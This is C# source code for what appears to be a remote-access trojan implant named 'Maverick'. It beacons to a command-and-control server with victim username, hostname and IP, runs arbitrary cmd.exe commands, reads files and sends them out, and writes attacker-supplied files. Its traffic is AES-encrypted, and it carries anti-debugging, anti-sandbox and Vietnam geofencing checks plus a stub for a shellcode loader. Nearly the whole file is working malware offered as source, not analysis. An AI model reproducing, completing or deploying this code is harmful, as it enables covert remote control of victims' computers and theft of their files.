#define Maverick
//#define Loader
#define AntiGeo

using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Text.Json.Serialization.Metadata;

#pragma warning disable IDE1006
#pragma warning disable IDE0130
#pragma warning disable IDE0079
#pragma warning disable IDE0305
#pragma warning disable CA1872
#pragma warning disable CA1835
#pragma warning disable SYSLIB1054

namespace __NS_Crypto__
{
    public class __ClassCrypto__
    {
#if Maverick
        public static async Task<byte[]> __EncryptPayload__(byte[] __rawPayload__)
        {
            try
            {
                var __IVrandom__ = RandomNumberGenerator.GetBytes(16);
                using Aes __aesInstance__ = Aes.Create();
                __aesInstance__.Key = __NS_Global__.__ClassGlobal__.__KeyAES__;
                __aesInstance__.IV = __IVrandom__;
                __aesInstance__.Mode = CipherMode.CBC;
                __aesInstance__.Padding = PaddingMode.PKCS7;
                using var __encryptor__ = __aesInstance__.CreateEncryptor(__aesInstance__.Key, __aesInstance__.IV);
                using var __msAES__ = new MemoryStream();
                using var __csAES__ = new CryptoStream(__msAES__, __encryptor__, CryptoStreamMode.Write);
                __msAES__.Write(__IVrandom__, 0, __IVrandom__.Length); // Prepend IV to the ciphertext
                await __csAES__.WriteAsync(__rawPayload__, 0, __rawPayload__.Length);
                __csAES__.FlushFinalBlock();
                return __msAES__.ToArray();
            }
            catch (Exception ex)
            {
                throw new InvalidOperationException(ex.Message);
            }
        }

        public static async Task<byte[]> __DecryptPayload__(byte[] __encPayoad__)
        {
            try
            {
                byte[] __ExtractedIV__ = __encPayoad__.Take(16).ToArray();
                byte[] __Ciphertext__ = __encPayoad__.Skip(16).ToArray();
                using Aes __aesInstance__ = Aes.Create();
                __aesInstance__.Key = __NS_Global__.__ClassGlobal__.__KeyAES__;
                __aesInstance__.IV = __ExtractedIV__;
                __aesInstance__.Mode = CipherMode.CBC;
                __aesInstance__.Padding = PaddingMode.PKCS7;
                using var __decryptor__ = __aesInstance__.CreateDecryptor(__aesInstance__.Key, __aesInstance__.IV);
                using var __msAES__ = new MemoryStream(__Ciphertext__);
                using var __csAES__ = new CryptoStream(__msAES__, __decryptor__, CryptoStreamMode.Read);
                using var __resultMS__ = new MemoryStream();
                await __csAES__.CopyToAsync(__resultMS__);
                return __resultMS__.ToArray();
            }
            catch (Exception ex)
            {
                throw new InvalidOperationException(ex.Message);
            }
        }


        public static string __GetRequestHeaderVallue__()
        {
            return __GetHash__(__NS_Global__.__ClassGlobal__.__SecretKey__);
        }

        public static string __GetHash__(string data)
        {
            byte[] byteData = Encoding.UTF8.GetBytes(data);
            return BitConverter.ToString(byteData).Replace("-", "").ToLowerInvariant();
        }
#endif

#if Loader
        public static async Task<byte[]> __DecryptShellcode__(byte[] __encShellcode__)
        {
            try
            {
                byte[] __ShellcodeIV__ = __encShellcode__.Take(16).ToArray();
                byte[] __ShellcodeKey__ = __HexToBytes__(__NS_Global__.__ClassGlobal__.__KeyShellcode__);
                byte[] __CipherText__ = __encShellcode__.Skip(16).ToArray();
                using Aes __aesInstance__ = Aes.Create();
                __aesInstance__.Key = __ShellcodeKey__;
                __aesInstance__.IV = __ShellcodeIV__;
                __aesInstance__.Mode = CipherMode.CBC;
                __aesInstance__.Padding = PaddingMode.PKCS7;
                using var __decryptor__ = __aesInstance__.CreateDecryptor(__aesInstance__.Key, __aesInstance__.IV);
                using var __msAES__ = new MemoryStream(__CipherText__);
                using var __csAES__ = new CryptoStream(__msAES__, __decryptor__, CryptoStreamMode.Read);
                using var __resultMS__ = new MemoryStream();
                await __csAES__.CopyToAsync(__resultMS__);
                return __resultMS__.ToArray();
            }
            catch (Exception ex)
            {
                throw new InvalidCastException(ex.Message);
            }
        }

        public static string __GetHashPassword__(byte[] __source__)
        {
            return BitConverter.ToString(SHA256.Create().ComputeHash(__source__)).Replace("-", "").ToLower();
        }

        private static byte[] __HexToBytes__(string __hexString__)
        {
            int __FinalHexLen__ = __hexString__.Length / 2;
            byte[] __BytesStorage__ = new byte[__FinalHexLen__];
            for (int i = 0; i < __FinalHexLen__; i++)
            {
                string __HexChar__ = __hexString__.Substring(i * 2, 2);
                __BytesStorage__[i] = Convert.ToByte(__HexChar__, 16);
            }
            return __BytesStorage__;
        }
#endif


    }

}

namespace __NS_Global__
{
    public class __ClassGlobal__
    {
#if Maverick
        public static readonly byte[] __KeyAES__ = Encoding.UTF8.GetBytes("MotNuHong_MotNuHongDanhChoMatNai");
        public static readonly string __SecretKey__ = "MatNaiChaChaCha";
        public static readonly string __BaseUrlC2Server__ = "http://127.0.0.1:8000";
#endif
#if Loader
        public static readonly string __KeyShellcode__ = "__DEFAULT_KEY__";
#endif
    }

#if Maverick
    [JsonSerializable(typeof(__InfoClientModel__))]
    public class __InfoClientModel__
    {
        public int InternalID { get; set; }
        public string? ClientID { get; set; }
        public string? Username { get; set; }
        public string? Hostname { get; set; }
        public string? OSversion { get; set; }
        public string? ClientVersion { get; set; }
        public string? ClientIP { get; set; }
    }

    [JsonSerializable(typeof(__CommadRequestModel__))]
    public class __CommadRequestModel__
    {
        public int InternalID { get; set; }
        public int CommandID { get; set; }
        public string? ActionType { get; set; }
        public string? Command { get; set; }
        public byte[]? Data { get; set; }
        public __FileUploadModel__? FileUpload { get; set; }
    }

    [JsonSerializable(typeof(__FileUploadModel__))]
    public class __FileUploadModel__
    {
        public string? Filename { get; set; }
        public byte[]? FileData { get; set; }
    }

    [JsonSourceGenerationOptions(WriteIndented = false, PropertyNamingPolicy = JsonKnownNamingPolicy.Unspecified)]
    [JsonSerializable(typeof(__InfoClientModel__))]
    [JsonSerializable(typeof(__CommadRequestModel__))]
    [JsonSerializable(typeof(__FileUploadModel__))]
    internal partial class MyJsonContext : JsonSerializerContext
    {
    }

#endif
}

namespace __NS_NativeMethod__
{
    public class __ClassNativeMethod__
    {

    }
}

#if Maverick
namespace __NS_Utils__
{
    public class __ClassUtils__
    {
        public static string __GetIpv4__()
        {
            var __localIP__ = "127.0.0.1";
            var __MachineHost__ = Dns.GetHostEntry(Dns.GetHostName());
            foreach(var __EachIp__ in __MachineHost__.AddressList)
            {
                if(__EachIp__.AddressFamily == AddressFamily.InterNetwork)
                {
                    __localIP__ = __EachIp__.ToString();
                    break;
                }
            }
            return __localIP__;
        }

    }
}

namespace __NS_ActionFunction__
{
    public class __ClassActionFunction__
    {
        public static async Task<__NS_Global__.__FileUploadModel__?> __PerformReadFile__(string? __filename__)
        {
            try
            {
                if (string.IsNullOrEmpty(__filename__)) return null;
                if (!File.Exists(__filename__)) return null;
                var __FileData__ = await File.ReadAllBytesAsync(__filename__);
                var __returnModel__ = new __NS_Global__.__FileUploadModel__
                {
                    FileData = __FileData__,
                    Filename = __filename__
                };
                return __returnModel__;
            }
            catch (Exception)
            {
                return null;
            }
        }

        public static async Task<bool> __PerformWriteFile__(string? __nameFromCommand__ , __NS_Global__.__FileUploadModel__? __fileToWrite__)
        {
            try
            {
                if (__fileToWrite__ == null || __fileToWrite__.FileData == null) return false;
                string __filename__ = string.IsNullOrEmpty(__nameFromCommand__) ? __fileToWrite__.Filename ?? $"{Guid.NewGuid().ToString()}.dat" : __nameFromCommand__;
                await File.WriteAllBytesAsync(__filename__, __fileToWrite__.FileData);
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }

        public static async Task<byte[]?> __PerformDoCommand__(string? __todoCommand__)
        {
            if (string.IsNullOrEmpty(__todoCommand__)) return null;
            try
            {
                var __newProcess__ = new Process();
                __newProcess__.StartInfo.FileName = "cmd.exe";
                __newProcess__.StartInfo.Arguments = $"/c {__todoCommand__}";
                __newProcess__.StartInfo.RedirectStandardOutput = true;
                __newProcess__.StartInfo.RedirectStandardError = true;
                __newProcess__.StartInfo.UseShellExecute = false;
                __newProcess__.StartInfo.CreateNoWindow = true;
                __newProcess__.Start();
                var __cmdOutput__ = await __newProcess__.StandardOutput.ReadToEndAsync();
                if (string.IsNullOrEmpty(__cmdOutput__))
                    __cmdOutput__ = await __newProcess__.StandardError.ReadToEndAsync();
                await __newProcess__.WaitForExitAsync();
                return Encoding.Unicode.GetBytes(__cmdOutput__);

            }
            catch (Exception)
            {
                return null;
            }
        }

        public static void __PerformKillSystem__()
        {
            Environment.Exit(0);
        }

        public static void __PerformRebootSystem__()
        {
            System.Diagnostics.Process.Start("shutdown", "/r /f /t 0");
        }
    }
}

namespace __NS_Traffic__
{
    public class __ClassTraffic__
    {
        private static readonly HttpClient __http__;
        private static readonly string __HeaderHashCheck__;

        static __ClassTraffic__()
        {
            __HeaderHashCheck__ = __NS_Crypto__.__ClassCrypto__.__GetRequestHeaderVallue__();
            __http__ = new HttpClient();
            __http__.DefaultRequestHeaders.Add("X-Request-Hash", __HeaderHashCheck__);
        }
        public static async Task<byte[]?> __SendPayload__(string __url__, byte[] __payload__)
        {
            try
            {
                using var __content__ = new ByteArrayContent(__payload__);
                var __response__ = await __http__.PostAsync(__url__, __content__);
                __response__.EnsureSuccessStatusCode();
                return await __response__.Content.ReadAsByteArrayAsync();
            }
            catch(Exception)
            {
                return null;
            }

        }
    }
}

namespace __NS_CommandSender__
{
    public static class __ClassCommandSender__
    {
        private static int __InternalID__ = 0;
        private static readonly string __LocalIPv4__ = __NS_Utils__.__ClassUtils__.__GetIpv4__();
        private static bool __IsRegisted__ = false;

        private static byte[] __GenerateClientInfoPayload__()
        {
            var __info__ = new __NS_Global__.__InfoClientModel__
            {
                InternalID = __InternalID__,
                ClientID = Guid.NewGuid().ToString(),
                Username = Environment.UserName,
                Hostname = Environment.MachineName,
                OSversion = Environment.OSVersion.ToString(),
                ClientVersion = "1.0.0",
                ClientIP = __LocalIPv4__
            };
            return Encoding.UTF8.GetBytes(JsonSerializer.Serialize(__info__, __NS_Global__.MyJsonContext.Default.__InfoClientModel__));
        }

        private static byte[] __GenerateResponseCommand__(__NS_Global__.__CommadRequestModel__ __cmdReqModel__, byte[]? __cmdRes__, __NS_Global__.__FileUploadModel__? __cmdFileModel__)
        {
            var __cmdToGen__ = new __NS_Global__.__CommadRequestModel__
            {
                InternalID = __InternalID__,
                ActionType = __cmdReqModel__.ActionType,
                Data = __cmdRes__,
                FileUpload = __cmdFileModel__,
                Command = __cmdReqModel__.Command,
                CommandID = __cmdReqModel__.CommandID
            };
            return Encoding.UTF8.GetBytes(JsonSerializer.Serialize(__cmdToGen__, __NS_Global__.MyJsonContext.Default.__CommadRequestModel__));
        }

        public static async Task __BeaconingAsync__()
        {
            if (!__IsRegisted__)
            {
                var __encPayloadInfo__ = await __NS_Crypto__.__ClassCrypto__.__EncryptPayload__(__GenerateClientInfoPayload__());
                var __responseInfo__ = await __NS_Traffic__.__ClassTraffic__.__SendPayload__($"{__NS_Global__.__ClassGlobal__.__BaseUrlC2Server__}/api/new", __encPayloadInfo__);
                if (__responseInfo__ == null) return;
                if (int.TryParse(Encoding.UTF8.GetString(__responseInfo__), out int __assignedID__))
                {
                    __InternalID__ = __assignedID__;
                    __IsRegisted__ = true;
                }
                return;
            }

            if (__InternalID__ == 0)
            {
                __IsRegisted__ = false;
                return;
            }

            var __newCommand__ = await __NS_Traffic__.__ClassTraffic__.__SendPayload__($"{__NS_Global__.__ClassGlobal__.__BaseUrlC2Server__}/api/get",BitConverter.GetBytes(__InternalID__));
            if(__newCommand__ != null && __newCommand__.Length > 0)
            {
                try
                {
                    var __firstCheck__ = Encoding.UTF8.GetString(__newCommand__);
                    if (uint.TryParse(__firstCheck__, out var __result__))
                    {
                        if (__result__ == 0xffffffff)
                        {
                            __InternalID__ = 0;
                            __IsRegisted__ = false;
                        }
                        if (__result__ == 0) return;
                    }
                }
                catch { }
                var __rawData__ = await __NS_Crypto__.__ClassCrypto__.__DecryptPayload__(__newCommand__);
                var __Command__ = JsonSerializer.Deserialize(__rawData__, __NS_Global__.MyJsonContext.Default.__CommadRequestModel__);
                if (__Command__ == null) return;
                switch (__Command__.ActionType)
                {
                    case "INFOCLIENT":
                        {
                            var __infoClientData__ = __GenerateClientInfoPayload__();
                            var __encryptData = await __NS_Crypto__.__ClassCrypto__.__EncryptPayload__(__infoClientData__);
                            await __NS_Traffic__.__ClassTraffic__.__SendPayload__($"{__NS_Global__.__ClassGlobal__.__BaseUrlC2Server__}/api/post", __encryptData);
                            break;
                        }
                    case "GETFILE":
                        {
                            var fileData = await __NS_ActionFunction__.__ClassActionFunction__.__PerformReadFile__(__Command__.Command);
                            var toSend = __GenerateResponseCommand__(__Command__, null, fileData);
                            var encryptData = await __NS_Crypto__.__ClassCrypto__.__EncryptPayload__(toSend);
                            await __NS_Traffic__.__ClassTraffic__.__SendPayload__($"{__NS_Global__.__ClassGlobal__.__BaseUrlC2Server__}/api/post", encryptData);
                            break;
                        }
                    case "SENDFILE":
                        {
                            var success = await __NS_ActionFunction__.__ClassActionFunction__.__PerformWriteFile__(__Command__.Command, __Command__.FileUpload);
                            var response = Encoding.UTF8.GetBytes(success ? "Ok" : "");
                            var toSend = __GenerateResponseCommand__(__Command__, response, null);
                            var encryptData = await __NS_Crypto__.__ClassCrypto__.__EncryptPayload__(toSend);
                            await __NS_Traffic__.__ClassTraffic__.__SendPayload__($"{__NS_Global__.__ClassGlobal__.__BaseUrlC2Server__}/api/post", encryptData);
                            break;
                        }
                    case "DOCOMMAND":
                        {
                            var output = await __NS_ActionFunction__.__ClassActionFunction__.__PerformDoCommand__(__Command__.Command);
                            var toSend = __GenerateResponseCommand__(__Command__, output, null);
                            var encryptData = await __NS_Crypto__.__ClassCrypto__.__EncryptPayload__(toSend);
                            await __NS_Traffic__.__ClassTraffic__.__SendPayload__($"{__NS_Global__.__ClassGlobal__.__BaseUrlC2Server__}/api/post", encryptData);
                            break;
                        }
                    case "KILLAPPLICATION":
                        {
                            var toSend = __GenerateResponseCommand__(__Command__, Encoding.UTF8.GetBytes("Ok"), null);
                            var encryptData = await __NS_Crypto__.__ClassCrypto__.__EncryptPayload__(toSend);
                            await __NS_Traffic__.__ClassTraffic__.__SendPayload__($"{__NS_Global__.__ClassGlobal__.__BaseUrlC2Server__}/api/post", encryptData);
                            __NS_ActionFunction__.__ClassActionFunction__.__PerformKillSystem__();
                            break;
                        }
                    default:
                        {
                            // Unknown command
                            break;
                        }
                }
            }
        }
    }

}
#endif

namespace __NS_Anti__
{
    public static class __ClassBlockUntrustedDll__
    {
        [DllImport("ke" + "rne" + "l32.d" + "ll", SetLastError = true)]
        private static extern bool SetProcessMitigationPolicy(int __mitigationPolicy__, ref uint __lpBuffer__, int __dwLength__);

        public static bool __EnableDllBlock__()
        {
            uint __policyFlags__ = 5;
            var __suc__ = SetProcessMitigationPolicy(8, ref __policyFlags__, sizeof(uint));
            __policyFlags__ = 7;
            __suc__ = SetProcessMitigationPolicy(10, ref __policyFlags__, sizeof(uint));
            __policyFlags__ = 1;
            __suc__ = SetProcessMitigationPolicy(6, ref __policyFlags__, sizeof(uint));
            return __suc__;
        }
    }

    public static class __ClassAntiDebug__
    {
        [DllImport("kernel32.dll")]
        private static extern bool IsDebuggerPresent();
        public static bool __CheckDebugging__()
        {
            return IsDebuggerPresent();
        }
    }

    public static class __ClassAntiSandbox__
    {
        public static bool __CheckSandbox__()
        {
            //implement more here
            string __triageSandbox__ = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "My Wallpaper.jpg");
            if (File.Exists(__triageSandbox__)) return true;
            if (System.AppDomain.CurrentDomain.FriendlyName.Contains("Sandbox")) return true;
            return false;
        }
    }

#if AntiGeo
    public static class __ClassAntiGeo__
    {
        private static bool __IsVietNamLocale__()
        {
            try
            {
                var __culture__ = System.Globalization.CultureInfo.CurrentCulture;
                return __culture__ != null && __culture__.Name.StartsWith("vi", StringComparison.OrdinalIgnoreCase);
            }
            catch (Exception)
            {
                return false;
            }
        }

        private static bool __IsVietNamRegion__()
        {
            try
            {
                var __region__ = System.Globalization.RegionInfo.CurrentRegion;
                return __region__ != null && __region__.TwoLetterISORegionName.Equals("VN", StringComparison.OrdinalIgnoreCase);
            }
            catch (Exception)
            {
                return false;
            }
        }

        private static bool __IsVietNameDateFormat__()
        {
            try
            {
                var __culture__ = System.Globalization.CultureInfo.CurrentCulture;
                var __datePattern__ = __culture__.DateTimeFormat.ShortDatePattern;
                return __datePattern__ != null && __datePattern__.Contains("dd/MM/yyyy");
            }
            catch (Exception)
            {
                return false;
            }
        }

        private static bool __IsValidVietNamTimeZone__()
        {
            try
            {
                var __timeZone__ = TimeZoneInfo.Local;
                return __timeZone__ != null && (__timeZone__.Id.Equals("SE Asia Standard Time", StringComparison.OrdinalIgnoreCase) || __timeZone__.Id.Equals("Asia/Ho_Chi_Minh", StringComparison.OrdinalIgnoreCase));
            }
            catch (Exception)
            {
                return false;
            }
        }

        private static bool __IsInVietNam__()
        {
            int __num__ = 0;
            if (__IsValidVietNamTimeZone__()) __num__++;
            if (__IsVietNamLocale__()) __num__++;
            if (__IsVietNamRegion__()) __num__++;
            if (__IsVietNameDateFormat__()) __num__++;
            return __num__ >= 2;
        }

        public static bool __IsSuspiciousEnvironment__()
        {
            return __IsInVietNam__();
        }

        public static bool __ShouldContinueExecution__()
        {
            return !__IsSuspiciousEnvironment__();
        }
    }
#endif

}

namespace __NS_Program__
{
    internal class __Program__
    {
        static __Program__()
        {
            __NS_Anti__.__ClassBlockUntrustedDll__.__EnableDllBlock__();
#if AntiGeo
            if (__NS_Anti__.__ClassAntiGeo__.__IsSuspiciousEnvironment__()) Environment.Exit(0);
#endif
        }

        static async Task Main()
        {
            var __threadAnti__ = new Thread(() =>
            {

            });
            __threadAnti__.IsBackground = true;
            __threadAnti__.Start();

            var __rand__ = new Random();
            uint __dream__ = (uint)__rand__.Next(2000, 4000);
            double __delta__ = __dream__ / 1000 - 0.5;
            System.DateTime before = System.DateTime.Now;
            System.Threading.Thread.Sleep((int)__dream__);

#if Maverick
            int __counter__ = 0;
            while (__isConnected__)
            {
                Thread.Sleep(2000);
                __counter__++;
                if (__counter__ >= 30)
                {
                    if (__NS_Anti__.__ClassAntiGeo__.__ShouldContinueExecution__())
                    {
                        __isConnected__ = false;
                    }
                    Thread.Sleep(10000); //nghi ngoi
                    __counter__ = 0;
                }
                await __NS_CommandSender__.__ClassCommandSender__.__BeaconingAsync__();
            }
#endif

#if Loader

#endif
            __threadAnti__.Join();
        }

        private static bool __isConnected__ = true;

    }
}
